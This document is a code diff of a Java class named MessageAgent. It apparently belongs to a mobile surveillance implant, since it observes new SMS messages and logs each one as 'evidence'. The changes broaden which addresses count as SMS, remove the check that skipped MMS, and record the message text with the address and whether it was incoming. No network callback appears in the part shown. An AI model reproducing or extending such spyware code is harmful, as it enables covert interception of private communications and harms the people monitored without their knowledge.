@@ -452,14 +452,16 @@ public final class MessageAgent extends Agent implements SmsObserver,
         //lastcheck = new Date(0); 
     }
 
-    public boolean onNewSms(final byte[] message, String address,
+    public boolean onNewSms(final byte[] byteMessage, String address,
             final boolean incoming) {
+        
+        String message =  new String(byteMessage);
         //#ifdef DBC
         Check.requires(message != null, "saveLog: null message");
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog: " + message);
+        debug.trace("saveLog message: " + message + " address: "+ address+" incoming: "+ incoming);
         //#endif
 
         //final byte[] dataMsg = getSmsDataMessage(message);
@@ -469,7 +471,6 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
         //final ByteArrayOutputStream os = null;
         try {
-
             final int flags = incoming ? 1 : 0;
 
             DateTime filetime = null;
@@ -482,8 +483,8 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
             // Check if it's actually a sms
 
-            final String prefix = "sms://";
-            if (address.indexOf(prefix) == 0) {
+            final String prefix = "//";
+            if (address.indexOf(prefix) >= 0) {
                 address = address.substring(prefix.length());
             } else {
                 //#ifdef DEBUG
@@ -492,15 +493,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
                 return false;
             }
 
-            if (address.indexOf(":") > 0) {
-                //#ifdef DEBUG
-                debug.warn("Probably a MMS");
-                //#endif
-                return false;
-            }
-
             // Filling fields
-
             final Date date = new Date();
 
             if (incoming) {
@@ -543,7 +536,7 @@ public final class MessageAgent extends Agent implements SmsObserver,
 
             // Creating log
             if (message != null) {
-                createEvidence(additionalData, message, EvidenceType.SMS_NEW);
+                createEvidence(additionalData, WChar.getBytes(message), EvidenceType.SMS_NEW);
                 return false;
             } else {
                 //#ifdef DEBUG
